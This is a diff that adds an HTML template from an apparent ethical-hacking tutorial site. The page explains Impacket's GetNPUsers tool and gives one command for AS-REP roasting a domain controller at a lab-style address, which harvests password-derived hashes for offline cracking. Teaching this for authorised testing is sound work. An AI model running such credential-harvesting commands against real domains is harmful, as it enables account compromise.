@@ -1,0 +1,19 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is impacket-GetNPUsers?</h1>
+
+    <p class="common">Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.</p>
+
+
+    <h1>Usage : AS-REP Roasting</h1>
+    <div class="code-box"><pre><code>impacket-GetNPUsers DomainName/$name -request -no-pass -dc-ip 10.129.95.180</code></pre></div>
+</body>
+</html>
